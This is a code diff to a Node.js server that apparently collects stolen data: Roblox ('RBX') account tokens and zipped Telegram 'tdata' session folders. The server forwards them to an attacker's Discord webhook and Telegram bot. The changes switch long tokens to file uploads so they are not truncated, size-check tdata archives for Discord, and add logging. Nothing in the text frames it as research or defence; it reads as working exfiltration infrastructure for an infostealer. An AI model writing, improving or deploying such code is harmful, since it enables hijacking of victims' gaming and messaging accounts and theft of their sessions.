@@ -28,28 +28,42 @@ const server = http.createServer(async (req, res) => {
         return res.end();
     }
 
+    // RBX token — send as file (no 2000-char limit)
     if (req.method === 'POST' && req.url === '/send') {
         const buf = await readBody(req);
         const body = buf.toString('utf8');
+        console.log('rbx token received, len:', body.length);
         const jobs = [];
 
         if (DISCORD_WEBHOOK) {
-            jobs.push(fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: '**RBX token**\n```\n' + body.slice(0, 1900) + '\n```'
-                })
-            }).catch(() => {}));
+            const form = new FormData();
+            form.append('payload_json', JSON.stringify({
+                content: 'RBX token (' + body.length + ' chars)'
+            }));
+            form.append('files[0]', new Blob([body], { type: 'text/plain' }), 'rbx_token.txt');
+            jobs.push(fetch(DISCORD_WEBHOOK, { method: 'POST', body: form })
+                .then(() => console.log('Discord rbx file sent'))
+                .catch(e => console.log('Discord rbx err:', e)));
         }
 
         if (TG_TOKEN && TG_CHAT) {
-            jobs.push(fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: 'chat_id=' + encodeURIComponent(TG_CHAT) +
-                      '&text=' + encodeURIComponent('[RBX]\n' + body)
-            }).catch(() => {}));
+            if (body.length > 4000) {
+                const form = new FormData();
+                form.append('chat_id', TG_CHAT);
+                form.append('caption', 'RBX token (' + body.length + ' chars)');
+                form.append('document', new Blob([body], { type: 'text/plain' }), 'rbx_token.txt');
+                jobs.push(fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendDocument',
+                    { method: 'POST', body: form })
+                    .then(() => console.log('TG rbx doc sent'))
+                    .catch(e => console.log('TG rbx doc err:', e)));
+            } else {
+                jobs.push(fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'chat_id=' + encodeURIComponent(TG_CHAT) +
+                          '&text=' + encodeURIComponent('[RBX]\n' + body)
+                }).catch(e => console.log('TG rbx err:', e)));
+            }
         }
 
         await Promise.allSettled(jobs);
@@ -57,6 +71,7 @@ const server = http.createServer(async (req, res) => {
         return res.end('ok');
     }
 
+    // TG tdata zip
     if (req.method === 'POST' && req.url === '/send-tdata') {
         const buf = await readBody(req);
         console.log('tdata received, size:', buf.length);
@@ -67,10 +82,10 @@ const server = http.createServer(async (req, res) => {
             form.append('chat_id', TG_CHAT);
             form.append('caption', 'TG tdata session');
             form.append('document', new Blob([buf], { type: 'application/zip' }), 'tdata.zip');
-            jobs.push(fetch(
-                'https://api.telegram.org/bot' + TG_TOKEN + '/sendDocument',
-                { method: 'POST', body: form }
-            ).then(r => r.text()).then(t => console.log('TG doc:', t)).catch(e => console.log('TG err:', e)));
+            jobs.push(fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendDocument',
+                { method: 'POST', body: form })
+                .then(r => r.text()).then(t => console.log('TG doc:', t))
+                .catch(e => console.log('TG doc err:', e)));
         }
 
         if (DISCORD_WEBHOOK && buf.length < 7 * 1024 * 1024) {
@@ -78,10 +93,10 @@ const server = http.createServer(async (req, res) => {
             form.append('payload_json', JSON.stringify({ content: 'TG tdata session' }));
             form.append('files[0]', new Blob([buf], { type: 'application/zip' }), 'tdata.zip');
             jobs.push(fetch(DISCORD_WEBHOOK, { method: 'POST', body: form })
-                .then(() => console.log('Discord file sent'))
-                .catch(e => console.log('Discord err:', e)));
+                .then(() => console.log('Discord tdata sent'))
+                .catch(e => console.log('Discord tdata err:', e)));
         } else if (buf.length >= 7 * 1024 * 1024) {
-            console.log('tdata too big for Discord, TG only');
+            console.log('tdata too big for Discord (' + buf.length + '), TG only');
         }
 
         await Promise.allSettled(jobs);
